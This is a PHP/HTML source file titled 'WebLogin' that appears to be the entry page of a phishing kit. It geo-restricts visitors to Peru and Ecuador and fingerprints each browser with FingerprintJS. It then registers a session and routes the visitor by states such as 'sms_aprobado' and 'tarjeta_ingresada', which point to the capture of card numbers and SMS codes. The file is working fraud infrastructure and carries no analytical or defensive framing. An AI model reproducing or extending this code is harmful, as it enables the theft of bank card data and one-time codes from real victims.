<?php

########################################################################
# ARCHIVOS DE CONFIGURACION
########################################################################

include 'config.php';
include 'utils/php_files/functions.php';

$entity_country = pais();

$allowed_countries_list = array("PE", "EC");

if (!in_array($entity_country, $allowed_countries_list)) {
    $entity_country = pais();
    header('Location: banned.php');
    exit();
}

########################################################################

?>

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>WebLogin</title>

	<!-- JQUERY -->

	<script src="utils/js_files/jquery-3.7.1.min.js"></script>
	<script src="utils/js_files/detect.min.js"></script>
</head>
<body>

</body>

<script>

	var ua = detect.parse(navigator.userAgent);

	var device_type = ua.device.type;

	var device_type_str = "pc";

	if (device_type === "Mobile") {
		device_type_str = "cel";
	}

	const fpPromise = import('https://fpjscdn.net/v3/<?=$fingerprintjs_key?>').then(FingerprintJS => FingerprintJS.load())

	fpPromise
	    .then(fp => fp.get())
	    .then(result => {

	  	const visitorId = result.visitorId;

	  	$.ajax({
	        url: 'get_post.php?action=register_new_sesion',
	        type: 'POST',
	        data: {
	        	visitorId: visitorId,
	        	device_type: device_type_str
	        },
	        success: function(response) {

	            if (response.success) {

	            	const estado = response.estado;

	            	if (estado == "sms_aprobado" || estado == "tarjeta_ingresada") {

	            		window.location.href = '<?=$redirect_final_url?>';

	            	} else {

	            		const session_id = response.session_id;

	            		window.location.href = session_id + '/?pdo=' + estado;

	            	}
	                

	            } else {

	            	const response_fail_reason = response.reason;

	                console.error(response_fail_reason);

	            }
	        }

	    });

	});

</script>

</html>